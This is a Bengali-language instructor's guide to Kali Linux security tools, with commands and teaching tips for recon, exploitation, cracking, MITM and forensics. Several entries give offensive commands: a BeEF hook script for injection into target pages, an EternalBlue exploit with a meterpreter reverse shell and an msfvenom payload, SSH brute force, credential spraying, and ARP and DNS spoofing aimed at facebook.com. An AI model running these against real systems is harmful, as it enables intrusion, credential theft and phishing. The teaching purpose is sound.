## ১. Information Gathering & OSINT (তথ্য সংগ্রহ ও ফুটপ্রিন্টিং)

> হ্যাকিং বা সিকিউরিটি অডিটের প্রথম ধাপ হলো *Reconnaissance* (রেকি)। কোনো সিস্টেমে আঘাত হানার আগে টার্গেট সম্পর্কে যত বেশি তথ্য জানা যাবে, অ্যাটাক সারফেস তত বড় হবে।

### ১. Whois
* **সহজ ভাষায় পরিচিতি:** ইন্টারনেটের ডোমেইন নেম এবং আইপি ব্লকের মালিকানা সংক্রান্ত অফিসিয়াল রেকর্ড দেখার টুল।
* **প্রধান Use Cases:**
  * ডোমেইন কার নামে বা কোন প্রতিষ্ঠানের নামে রেজিস্টার করা তা বের করা।
  * অ্যাডমিনিস্ট্রেটর ও টেকনিক্যাল কন্টাক্ট ইমেইল এবং ফোন নম্বর খোঁজা।
  * নেমসার্ভার (DNS) এবং হোস্টিং প্রোভাইডারের তথ্য জানা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  whois example.com
  whois 8.8.8.8
  ```
* 💡 **Teaching Tip:** শিক্ষার্থীদের বোঝাবেন এটি ডোমেইনের "জাতীয় পরিচয়পত্র" দেখার মতো। প্রাইভেসি গার্ড (`WhoisGuard`) সক্রিয় থাকলে অনেক সময় আসল তথ্য লুকিয়ে থাকে।

---

### ২. TheHarvester
* **সহজ ভাষায় পরিচিতি:** ওপেন সোর্স ইন্টেলিজেন্স (OSINT) টুল, যা বিভিন্ন সার্চ ইঞ্জিন ও সোশ্যাল নেটওয়ার্ক স্ক্যান করে টার্গেটের ইমেইল অ্যাড্রেস, সাবডোমেইন ও নাম সংগ্রহ করে।
* **প্রধান Use Cases:**
  * টার্গেট অর্গানাইজেশনের কর্মচারীদের অফিসিয়াল ইমেইল লিস্ট তৈরি করা (ফিশিং অ্যাসেসমেন্টের জন্য)।
  * ইন্টারনেটে ইনডেক্স হয়ে থাকা গোপন সাবডোমেইন খুঁজে বের করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  theHarvester -d example.com -l 500 -b google,bing,linkedin
  ```
  * `-d`: টার্গেট ডোমেইন
  * `-l`: রেজাল্ট লিমিট
  * `-b`: ডাটা সোর্স (Google, Bing, LinkedIn, Shodan ইত্যাদি)
* 💡 **Teaching Tip:** শিক্ষার্থীদের দেখাবেন কীভাবে কোম্পানির কর্মচারীদের পাবলিক ইমেইল প্যাটার্ন (যেমন: `firstname.lastname@company.com`) আইডেন্টিফাই করা যায়।

---

### ৩. Recon-ng
* **সহজ ভাষায় পরিচিতি:** পাইথন দিয়ে তৈরি একটি মডুলার রিকন ফ্রেমওয়ার্ক, যার ইন্টারফেস এবং কমান্ড গঠন একদম **Metasploit**-এর মতো।
* **প্রধান Use Cases:**
  * এক জায়গায় বসে স্বয়ংক্রিয়ভাবে DNS, Contacts, সাবডোমেইন ও ভ্যালনারেবিলিটি ডাটা সংগ্রহ।
  * ডাটাবেসে তথ্য সাজিয়ে রাখা যাতে পরবর্তীতে রিপোর্ট তৈরি করা যায়।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  recon-ng
  marketplace search
  marketplace install hackertarget
  modules load recon/domains-hosts/hackertarget
  options set SOURCE example.com
  run
  ```
* 💡 **Teaching Tip:** মেটাস্প্লয়েটের সাথে মিল থাকায় শিক্ষার্থীরা কমান্ড সিনট্যাক্স (`use`, `show options`, `set`, `run`) সহজেই মনে রাখতে পারবে।

---

### ৪. Maltego
* **সহজ ভাষায় পরিচিতি:** একটি পাওয়ারফুল GUI-ভিত্তিক ভিজ্যুয়াল লিংক অ্যানালাইসিস টুল।
* **প্রধান Use Cases:**
  * ব্যক্তি, ইমেইল, ডোমেইন, আইপি, কোম্পানি ও সোশ্যাল মিডিয়ার মধ্যকার জটিল সম্পর্ককে গ্রাফ আকারে ফুটিয়ে তোলা।
  * থ্রেট ইন্টেলিজেন্স এবং ফ্রড ইনভেস্টিগেশন।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  maltego
  ```
* 💡 **Teaching Tip:** ক্লাসে একটি ডোমেইন বা ইমেইল দিয়ে "Transform" রান করে চোখের সামনে নোড কানেকশন তৈরি হওয়া দেখালে শিক্ষার্থীরা খুব সহজে রিলেশনশিপ ম্যাপিং বুঝতে পারে।

---

## ২. Social Engineering & Browser Exploitation

---

### ৫. Social Engineering Toolkit (SET)
* **সহজ ভাষায় পরিচিতি:** সাইবার সিকিউরিটিতে মানুষের অসচেতনতাকে টার্গেট করে অ্যাটাক ভেক্টর তৈরি করার একটি অল-ইন-ওয়ান ফ্রেমওয়ার্ক।
* **প্রধান Use Cases:**
  * ফিশিং বা সোশ্যাল ইঞ্জিনিয়ারিং সিমুলেশন চালানো।
  * জনপ্রিয় লগইন পেজ ক্লোন করে ক্রেডেনশিয়াল হার্ভেস্টিং টেস্ট করা।
  * ম্যালিসিয়াস পেলোডযুক্ত USB ড্রাইভ বা ফাইল তৈরি করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  sudo setoolkit
  # Menu: 1) Social-Engineering Attacks -> 2) Website Attack Vectors -> 3) Credential Harvester Attack Method -> 2) Site Cloner
  ```
* 💡 **Teaching Tip:** শিক্ষার্থীদের সতর্ক করবেন যে এটি কেবল অনুমোদিত অর্গানাইজেশনের ইন্টারনাল অ্যাওয়ারনেস ট্রেনিংয়ের জন্য ব্যবহার্য।

---

### ৬. Browser Exploitation Framework (BeEF)
* **সহজ ভাষায় পরিচিতি:** ক্লায়েন্ট-সাইড বা ব্রাউজারকেন্দ্রিক দুর্বলতা কাজে লাগানোর ফ্রেমওয়ার্ক।
* **প্রধান Use Cases:**
  * টার্গেটের ব্রাউজারকে একটি জাভাস্ক্রিপ্ট "Hook" ফাইলের মাধ্যমে নিজের সার্ভারের কন্ট্রোলে আনা।
  * ব্রাউজারের কুকি/সেশন টোকেন রিড করা, ফেক প্রম্পট দেখিয়ে পাসওয়ার্ড চুরি করা বা ব্রাউজার থেকে রিভার্স শেল নেওয়া।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  beef-xss
  # টার্গেট পেজে ইনজেক্ট করার স্ক্রিপ্ট:
  # <script src="http://<YOUR-IP>:3000/hook.js"></script>
  ```
* 💡 **Teaching Tip:** XSS (Cross-Site Scripting) ভালনারেবিলিটি থাকলে যে ব্রাউজার পর্যন্ত সম্পূর্ণ হ্যাক করা যায়, তা প্র্যাকটিক্যালি বোঝানোর সবচেয়ে সেরা টুল হলো BeEF।

---

## ৩. Network Host Scanning (নেটওয়ার্ক ও হোস্ট স্ক্যানিং)

---

### ৭. Ping
* **সহজ ভাষায় পরিচিতি:** নেটওয়ার্ক সংযোগ যাচাই করার সবচেয়ে মৌলিক ও প্রাথমিক কমান্ড-লাইন টুল (ICMP প্রোটোকল ব্যবহার করে)।
* **প্রধান Use Cases:**
  * রিমোট সার্ভার সচল (Alive) কি না দ্রুত যাচাই করা।
  * নেটওয়ার্ক ল্যাটেন্সি ও প্যাকেট ড্রপ ডায়াগনসিস করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  ping -c 4 192.168.1.1
  ```

---

### ৮. ARP-scan
* **সহজ ভাষায় পরিচিতি:** লোকাল এরিয়া নেটওয়ার্কে (Layer 2) আইপি এবং তাদের ফিজিক্যাল ম্যাক (MAC) অ্যাড্রেস ম্যাপিং করার টুল।
* **প্রধান Use Cases:**
  * লোকাল সাবনেটে উপস্থিত সকল সক্রিয় ডিভাইস শনাক্ত করা।
  * লুকায়িত বা ফায়ারওয়াল-ব্লকড হোস্ট খুঁজে বের করা (কারণ ARP রিকোয়েস্ট লোকাল সুইচে ব্লক করা যায় না)।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  sudo arp-scan --interface=eth0 --localnet
  ```

---

### ৯. Nmap / Zenmap
* **সহজ ভাষায় পরিচিতি:** নেটওয়ার্ক সিকিউরিটির "সুইস আর্মি নাইফ"। নেটওয়ার্ক ডিসকভারি এবং পোর্ট স্ক্যানিংয়ের বিশ্বমানসম্পন্ন টুল (Zenmap হলো এর অফিশিয়াল GUI)।
* **প্রধান Use Cases:**
  * ওপেন পোর্ট, রানিং সার্ভিস এবং তাদের সঠিক ভার্সন ডিটেক্ট করা।
  * অপারেটিং সিস্টেম ফিঙ্গারপ্রিন্টিং করা।
  * NSE (Nmap Scripting Engine) দিয়ে সার্ভিস মিসকনফিগারেশন বা ভালনারেবিলিটি স্ক্যান করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # Stealth SYN Scan + Service Version + OS Detection + Fast
  sudo nmap -sS -sV -O -T4 192.168.1.100

  # ভালনারেবিলিটি স্ক্রিপ্ট স্ক্যান
  nmap --script vuln 192.168.1.100
  ```
* 💡 **Teaching Tip:** `-sS` (Stealth/SYN scan) কেন ৩-ওয়ে হ্যান্ডশেক সম্পূর্ণ না করেই কাজ করে এবং ফায়ারওয়াল লগ এড়াতে সাহায্য করে—তা বোর্ডে ড্র করে বোঝাবেন।

---

## ৪. Digital Forensics (ডিজিটাল ফরেনসিক্স ও ইনভেস্টিগেশন)

---

### ১০. MagicRescue
* **সহজ ভাষায় পরিচিতি:** ফাইল সিস্টেম টেবিল নষ্ট হয়ে গেলেও ফাইলের ম্যাজিক বাইট (File Signature / Header) দেখে ফাইল রিকভার করার টুল।
* **প্রধান Use Cases:**
  * ফরম্যাট করা বা করাপ্ট হওয়া ডিস্ক থেকে নির্দিষ্ট ফাইল ফরম্যাট (যেমন: JPEG, PNG) উদ্ধার করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  magicrescue -d /recovered_files/ -r /usr/share/magicrescue/recipes/jpeg-jfif /dev/sdb1
  ```

---

### ১১. Scalpel
* **সহজ ভাষায় পরিচিতি:** ফাইল সিস্টেমের ওপর নির্ভর না করে র-ডিস্ক বা মেমোরি ডাম্প থেকে হেডার ও ফুটার ম্যাচ করে ফাইল খোদাই (File Carving) করে আনা।
* **প্রধান Use Cases:**
  * ফরেনসিক ডিস্ক ইমেজ (`.dd` ফাইল) বা মেমোরি ডাম্প থেকে ডিলিট করা ডকুমেন্ট/ইমেজ এক্সট্রাক্ট করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  scalpel -c /etc/scalpel/scalpel.conf -o /output_dir/ disk_image.dd
  ```

---

### ১২. Scrounge-NTFS
* **সহজ ভাষায় পরিচিতি:** বিশেষভাবে ক্ষতিগ্রস্ত উইন্ডোজ (NTFS) ড্রাইভের পার্টিশন টেবিল ও এমএফটি (MFT) স্ট্রাকচার রিড করে ডাটা রিকভার করার টুল।
* **প্রধান Use Cases:**
  * ক্ষতিগ্রস্ত উইন্ডোজ সিস্টেমের পার্টিশন ও ডিরেক্টরি ট্রি রিকভারি।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  scrounge-ntfs -m /dev/sdb1 -c 8 -o /recovered_data/ 63 4194303
  ```

---

### ১৩. Guymager
* **সহজ ভাষায় পরিচিতি:** লিনাক্সে ফরেনসিক এভিডেন্সের বিট-বাই-বিট ক্লোন বা ইমেজ তৈরি করার একটি নিরাপদ GUI টুল।
* **প্রধান Use Cases:**
  * হার্ডডিস্কের আসল ডাটা পরিবর্তন না করে ফরেনসিক ইমেজ (E01/DD) তৈরি করা।
  * ইনটিগ্রিটি প্রমাণের জন্য স্বয়ংক্রিয় MD5 ও SHA-256 হ্যাশ জেনারেট করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  sudo guymager
  ```
* 💡 **Teaching Tip:** ফরেনসিকের গোল্ডেন রুল শেখাবেন: "আসল এভিডেন্সে সরাসরি কাজ করা যাবে না, প্রথমে ইমেজ তৈরি করে ইমেজে কাজ করতে হবে।"

---

### ১৪. PDFiD
* **সহজ ভাষায় পরিচিতি:** সন্দেহজনক PDF ফাইলের ভেতরে কোনো বিপজ্জনক স্ক্রিপ্ট বা অ্যাকশন লুকানো আছে কি না তা দ্রুত যাচাই করার ট্রিয়াজ (Triage) টুল।
* **প্রধান Use Cases:**
  * ফিশিং অ্যাটাচমেন্টে আসা PDF-এ `/JavaScript`, `/JS`, `/Launch`, `/OpenAction` ট্যাগ আছে কি না চেক করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  pdfid invoice_malicious.pdf
  ```

---

### ১৫. PDF-Parser
* **সহজ ভাষায় পরিচিতি:** PDF ফাইলের ভেতরের নির্দিষ্ট অবজেক্ট (Objects) এবং এনকোডেড স্ট্রিম পুঙ্খানুপুঙ্খভাবে ভেঙে এক্সট্রাক্ট করার টুল।
* **প্রধান Use Cases:**
  * PDFiD-তে সন্দেহজনক অবজেক্ট ধরা পড়ার পর তার ভেতরে লুকানো ক্ষতিকর শেলকোড ডিকম্প্রেস ও অ্যানালাইসিস করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  pdf-parser.py -o 5 -f -d extracted_stream.bin invoice_malicious.pdf
  ```

---

### ১৬. The Sleuth Kit (TSK) & Autopsy
* **সহজ ভাষায় পরিচিতি:** 
  * **TSK:** ডিস্ক ভলিউম ও ফাইল সিস্টেমের মেটাডাটা অ্যানালাইসিস করার C-ভিত্তিক CLI টুলের সেট।
  * **Autopsy:** TSK ইঞ্জিনের ওপর ভিত্তি করে তৈরি পূর্ণাঙ্গ গ্রাফিক্যাল ডিজিটাল ফরেনসিক প্ল্যাটফর্ম।
* **প্রধান Use Cases:**
  * সম্পূর্ণ হার্ডড্রাইভ ইমেজ ইনভেস্টিগেশন, টাইমলাইন অ্যানালাইসিস (কে কখন কোন ফাইল খুলেছে/ডিলিট করেছে)।
  * কি-ওয়ার্ড সার্চ এবং কোর্টে জমা দেওয়ার মতো ফরেনসিক রিপোর্ট তৈরি।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # CLI (TSK)
  mmls evidence.img        # পার্টিশন টেবিল দেখা
  fls -r -p evidence.img   # ডিলিট করা ও বিদ্যমান ফাইলের লিস্ট দেখা

  # GUI
  autopsy
  ```

---

## ৫. Vulnerability Analysis & Exploitation (দুর্বলতা স্ক্যান ও শোষণ)

---

### ১৭. Nessus & OpenVAS (Greenbone)
* **সহজ ভাষায় পরিচিতি:** নেটওয়ার্ক ও সিস্টেমের ত্রুটি স্বয়ংক্রিয়ভাবে স্ক্যান করার জন্য বিশ্বের শীর্ষস্থানীয় ভালনারেবিলিটি স্ক্যানার। (Nessus এন্টারপ্রাইজ কমার্শিয়াল, OpenVAS ওপেন সোর্স)।
* **প্রধান Use Cases:**
  * আনপ্যাচড সফটওয়্যার, মিসকনফিগারেশন, ডিফল্ট পাসওয়ার্ড এবং সিকিউরিটি প্যাচ মিসিং খুঁজে বের করা।
  * CVE ডাটাবেসের সাথে মিলিয়ে রেমিডিয়েশন (সমাধান) গাইডলাইন প্রদান।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # Nessus চালু করা
  sudo systemctl start nessusd # Web: https://localhost:8834

  # OpenVAS চালু করা
  sudo gvm-start              # Web: https://127.0.0.1:9392
  ```

---

### ১৮. Burp Suite & OWASP ZAP
* **সহজ ভাষায় পরিচিতি:** ওয়েব অ্যাপ্লিকেশন পেনিট্রেশন টেস্টিংয়ের প্রধান দুটি প্রক্সি টুল (Interception Proxy)।
* **প্রধান Use Cases:**
  * ব্রাউজার এবং ওয়েবসাইটের মধ্যকার HTTP/HTTPS রিকোয়েস্ট মাঝপথে থামানো (Intercept) ও ডাটা ম্যানিপুলেট করা।
  * XSS, CSRF, SQL Injection, Authentication Bypass টেস্ট করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # Burp Suite লঞ্চ
  burpsuite &
  # ব্রাউজারে Proxy সেট করতে হয়: 127.0.0.1:8080

  # OWASP ZAP CLI Quick Scan
  zaproxy -cmd -quickurl http://example.com -quickout zap_report.html
  ```
* 💡 **Teaching Tip:** প্রক্সি কীভাবে ম্যান-ইন-দ্য-মিডল হিসেবে কাজ করে শিক্ষার্থীদের ডেমো দিয়ে দেখাবেন (যেমন: হিডেন ফর্ম ফিল্ড চেঞ্জ করা)।

---

### ১৯. Aircrack-ng, Reaver & Kismet (ওয়াই-ফাই সিকিউরিটি)
* **সহজ ভাষায় পরিচিতি:** 
  * **Aircrack-ng:** 802.11 ওয়্যারলেস নেটওয়ার্ক ক্যাপচার এবং WPA/WPA2 হ্যান্ডশেক ক্র্যাকিং স্যুট।
  * **Reaver:** রাউটারের দুর্বল WPS পিন ব্রুটফোর্স করে ওয়াইফাই পাসওয়ার্ড বের করার টুল।
  * **Kismet:** প্যাসিভ ওয়াইফাই ডিটেক্টর ও প্যাকেট স্নিফার (কোনো সিগন্যাল না পাঠিয়েই হিডেন SSID ও রোগ এপি ডিটেক্ট করে)।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # Aircrack-ng হ্যান্ডশেক ক্র্যাক
  sudo airmon-ng start wlan0
  aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

  # Reaver WPS অ্যাটাক
  sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
  ```

---

### ২০. Metasploit Framework & MSFvenom
* **সহজ ভাষায় পরিচিতি:** বিশ্বের সবচেয়ে জনপ্রিয় এক্সপ্লয়েট ফ্রেমওয়ার্ক এবং পেলোড জেনারেটর।
* **প্রধান Use Cases:**
  * সিস্টেমে থাকা দুর্বলতায় এক্সপ্লয়েট চালিয়ে অ্যাক্সেস নেওয়া।
  * কাস্টম শেল বা পেলোড (`msfvenom`) তৈরি করে টার্গেটে এক্সিকিউট করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # MSFconsole
  msfconsole -q
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS 192.168.1.100
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 192.168.1.50
  exploit

  # MSFvenom দিয়ে উইন্ডোজ পেলোড তৈরি
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
  ```

---

### ২১. Lynis
* **সহজ ভাষায় পরিচিতি:** ইউনিক্স/লিনাক্স সার্ভারগুলোর সিকিউরিটি অডিটিং এবং হার্ডেনিং করার ওপেন সোর্স টুল।
* **প্রধান Use Cases:**
  * সিস্টেম অ্যাডমিন ও ব্লু টিমের জন্য সার্ভারের পারমিশন, ফায়ারওয়াল, লগিং এবং কমপ্লায়েন্স স্কোর চেক করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  sudo lynis audit system
  ```

---

### ২২. SQLmap & jSQL Injection
* **সহজ ভাষায় পরিচিতি:** ওয়েব অ্যাপ্লিকেশনের SQL ইনজেকশন দুর্বলতা স্বয়ংক্রিয়ভাবে শনাক্ত ও ডাটাবেস ডাম্প করার টুল (SQLmap হলো CLI, jSQL হলো Java GUI)।
* **প্রধান Use Cases:**
  * ডাটাবেস ইঞ্জিনের ধরন ও ভার্সন জানা।
  * ডাটাবেস স্কিমা, টেবিল, কলাম এবং ডাটা উদ্ধার করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # SQLmap ডেমো
  sqlmap -u "http://example.com/item.php?id=1" --dbs --batch
  sqlmap -u "http://example.com/item.php?id=1" -D app_db --tables --batch
  ```

---

### ২৩. SearchSploit (Exploit-DB)
* **সহজ ভাষায় পরিচিতি:** Exploit-DB-এর অফলাইন কমান্ড-লাইন সার্চ ইঞ্জিন।
* **প্রধান Use Cases:**
  * টার্গেটে চলা সফটওয়্যার ভার্সনের জন্য পাবলিক এক্সপ্লয়েট কোড ইন্টারনেটে না গিয়ে অফলাইনেই খুঁজে বের করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  searchsploit apache 2.4.49
  searchsploit -m 50383 # লোকাল ডিরেক্টরিতে এক্সপ্লয়েট স্ক্রিপ্ট কপি করে আনে
  ```

---

### ২৪. CrackMapExec & NetExec (NXC)
* **সহজ ভাষায় পরিচিতি:** অ্যাক্টিভ ডিরেক্টরি (Active Directory) এবং লোকাল নেটওয়ার্ক পোস্ট-এক্সপ্লয়েটেশন ও পেন্টেস্টিং টুল।
* **প্রধান Use Cases:**
  * নেটওয়ার্ক জুড়ে ক্রেডেনশিয়াল স্প্রে করা (একটি পাসওয়ার্ড দিয়ে অনেক মেশিনে লগইন চেক করা)।
  * SMB শেয়ার, ডোমেইন ইউজার ও প্রিভিলেজ সহজে এনামারেট করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # SMB শেয়ার এবং লগইন টেস্ট
  crackmapexec smb 192.168.1.0/24 -u Administrator -p 'Password123'
  nxc smb 192.168.1.50 -u 'admin' -p 'password' --shares
  ```

---

## ৬. Password Cracking & Credential Testing

---

### ২৫. Hydra
* **সহজ ভাষায় পরিচিতি:** অত্যন্ত দ্রুতগতির মাল্টি-থ্রেডেড অনলাইন নেটওয়ার্ক লগইন ব্রুট-ফোর্সার।
* **প্রধান Use Cases:**
  * SSH, FTP, HTTP-POST, RDP, Telnet ইত্যাদি প্রোটোকলে পাসওয়ার্ড পলিসির দৃঢ়তা যাচাই করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50 -t 4
  ```
  * `-l`: নির্দিষ্ট ইউজারনেম (`-L` দিলে ফাইল)
  * `-P`: ওয়ার্ডলিস্ট ফাইল
  * `-t`: সমান্তরাল থ্রেড সংখ্যা

---

### ২৬. John the Ripper (JTR)
* **সহজ ভাষায় পরিচিতি:** পাসওয়ার্ড হ্যাশ অফলাইনে ক্র্যাক করার শক্তিশালী টুল।
* **প্রধান Use Cases:**
  * লিনাক্স শ্যাডো ফাইল (`/etc/shadow`), উইন্ডোজ NTLM হ্যাশ বা জিপ/পিডিএফ ফাইলের হ্যাশ ক্র্যাক করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # লিনাক্স শ্যাডো ফাইল ক্র্যাক
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hashes.txt
  ```

---

### ২৭. Crunch
* **সহজ ভাষায় পরিচিতি:** কাস্টম প্যাটার্ন এবং ক্যারেক্টার সেট ব্যবহার করে নিজস্ব ওয়ার্ডলিস্ট তৈরি করার টুল।
* **প্রধান Use Cases:**
  * পাসওয়ার্ড পলিসি জানা থাকলে (যেমন: ৬ অক্ষরের সব ছোট হাতের ও সংখ্যার কম্বিনেশন) কাস্টম ডিকশনারি বানানো।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # ৬ অক্ষরের বর্ণ ও সংখ্যার কম্বিনেশন তৈরি
  crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_wordlist.txt
  ```

---

## ৭. Network Sniffing, Spoofing & MITM (ম্যান-ইন-দ্য-মিডল ও ট্রাফিক অ্যানালাইসিস)

---

### ২৮. Wireshark & tcpdump
* **সহজ ভাষায় পরিচিতি:** নেটওয়ার্ক প্যাকেট ক্যাপচার ও ডিপ প্যাকেট ইন্সপেকশন টুল (Wireshark হলো GUI, tcpdump হলো টার্মিনাল CLI)।
* **প্রধান Use Cases:**
  * নেটওয়ার্কে চলমান আন-এনক্রিপ্টেড ডাটা (HTTP, FTP, Telnet পাসওয়ার্ড) দেখা।
  * সন্দেহজনক ম্যালওয়্যার কমিউনিকেশন ও নেটওয়ার্ক সমস্যা ট্রাবলশুট করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # tcpdump দিয়ে পোর্ট ৮০/৪৪৩ ক্যাপচার করে ফাইলে সেভ
  sudo tcpdump -i eth0 -nn -s0 -w traffic_capture.pcap port 80 or port 443

  # Wireshark দিয়ে pcap ফাইল অ্যানালাইসিস
  wireshark traffic_capture.pcap &
  ```

---

### ২৯. Ettercap, Bettercap & ARPspoof
* **সহজ ভাষায় পরিচিতি:** লোকাল নেটওয়ার্কে ARP পয়জনিং চালিয়ে ট্রাফিক নিজের কম্পিউটারের মধ্য দিয়ে পাস করানোর (MITM) টুল।
* **প্রধান Use Cases:**
  * লোকাল এরিয়া নেটওয়ার্কে সুইচ সিকিউরিটি বাইপাস করে দুই হোস্টের মধ্যকার ট্রাফিক পর্যবেক্ষণ করা।
  * ফেক DNS রেসপন্স তৈরি করা এবং সেশন হাইজ্যাক টেস্ট করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # ARPspoof (ভিকটিমকে বলা আমি গেটওয়ে)
  sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

  # Bettercap
  sudo bettercap -iface eth0
  # Bettercap প্রম্পটে: net.probe on; net.sniff on; arp.spoof on
  ```

---

### ৩০. DNSspoof
* **সহজ ভাষায় পরিচিতি:** লোকাল নেটওয়ার্কে কোনো ডোমেইনের রিকোয়েস্ট আসলে ভুয়া আইপিতে রিডাইরেক্ট করে দেওয়ার টুল।
* **প্রধান Use Cases:**
  * ফিশিং বা ক্রেডেনশিয়াল হার্ভেস্টিংয়ের জন্য ব্যবহারকারীকে ফেক সার্ভারে নিয়ে যাওয়া।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # hosts.txt ফাইলে থাকবে: 192.168.1.50 *.facebook.com
  sudo dnsspoof -i eth0 -f hosts.txt
  ```

---

## ৮. Mobile Penetration Testing & Reverse Engineering (Kali NetHunter)

---

### ৩১. Kali NetHunter Platform
* **সহজ ভাষায় পরিচিতি:** অ্যান্ড্রয়েড ডিভাইসের জন্য তৈরি ওপেন সোর্স মোবাইল পেনিট্রেশন টেস্টিং ওএস।
* **প্রধান Use Cases:**
  * পোর্টেবল পেন্টেস্টিং, BadUSB (HID Attack - কীবোর্ড ইনজেকশন), সফটওয়্যার ডিফাইনড রেডিও (SDR) ও এক্সটারনাল ওয়াইফাই কার্ড দিয়ে অ্যাসেসমেন্ট করা।
* **কমান্ড:**
  ```bash
  nethunter
  ```

---

### ৩২. APKTool
* **সহজ ভাষায় পরিচিতি:** অ্যান্ড্রয়েড অ্যাপ্লিকেশনের ক্লোজড-সোর্স APK ফাইল রিভার্স ইঞ্জিনিয়ারিং করার টুল।
* **প্রধান Use Cases:**
  * APK ডিকম্পাইল করে স্মালি (Smali) কোড, লেআউট XML এবং `AndroidManifest.xml` ফাইল পরিদর্শন ও মডিফাই করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  apktool d target_app.apk -o decompiled_app/
  ```

---

### ৩৩. JADX / JADX-GUI
* **সহজ ভাষায় পরিচিতি:** DEX ও APK ফাইলকে মানুষের পাঠযোগ্য খাঁটি Java সোর্স কোডে রূপান্তরকারী ডিকম্পাইলার।
* **প্রধান Use Cases:**
  * অ্যান্ড্রয়েড অ্যাপের সোর্স কোডে হার্ডকোডেড API Key, পাসওয়ার্ড বা ইনসিকিউর এন্ডপয়েন্ট খুঁজে বের করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  jadx-gui target_app.apk
  ```
* 💡 **Teaching Tip:** শিক্ষার্থীদের দেখাবেন কীভাবে মোবাইলের সাধারণ একটি APK থেকে ডেভেলপারদের ভুলবশত রেখে যাওয়া ব্যাকএন্ড API এবং সিক্রেট কী বের করে আনা যায়।

---

### ৩৪. Netcat (nc)
* **সহজ ভাষায় পরিচিতি:** নেটওয়ার্কিংয়ের "সুইস আর্মি নাইফ"—যেকোনো পোর্ট ওপেন করা বা যেকোনো পোর্টে ডাটা পাঠানো ও রিসিভ করার টুল।
* **প্রধান Use Cases:**
  * লিসেনার তৈরি করে রিভার্স শেল গ্রহণ করা।
  * পোর্ট স্ক্যানিং এবং ব্যানার গ্র্যাবিং করা।
* **কমান্ড ও ফ্ল্যাগ:**
  ```bash
  # লিসেনার চালু করা
  nc -lvnp 4444

  # অন্য হোস্টের নির্দিষ্ট পোর্টে কানেক্ট করা
  nc 192.168.1.50 80
  ```

---

### ৩৫. BusyBox
* **সহজ ভাষায় পরিচিতি:** শতাধিক স্ট্যান্ডার্ড ইউনিক্স/লিনাক্স ইউটিলিটিকে একটিমাত্র ছোট বাইনারির মধ্যে ধারণকারী পাওয়ারফুল প্যাকেজ।
* **প্রধান Use Cases:**
  * অ্যান্ড্রয়েড বা এমবেডেড ডিভাইসে যেখানে মিনিমাল লিনাক্স থাকে, সেখানে পূর্ণাঙ্গ লিনাক্স কমান্ড এনভায়রনমেন্ট পাওয়া।
* **কমান্ড:**
  ```bash
  busybox ls -la /system/bin
  ```

---

1. **শুরু Reconnaissance দিয়ে:** (Whois $\rightarrow$ theHarvester $\rightarrow$ Nmap)
2. **এরপর Vulnerability Discovery:** (Burp Suite $\rightarrow$ SQLmap $\rightarrow$ Nessus)
3. **এরপর Exploitation:** (Metasploit $\rightarrow$ Hydra)
4. **পোস্ট-এক্সপ্লয়েটেশন ও মনিটরিং:** (Wireshark $\rightarrow$ Bettercap)
5. **ফরেনসিক্স ও রিভার্স ইঞ্জিনিয়ারিং:** (Autopsy $\rightarrow$ APKTool / JADX)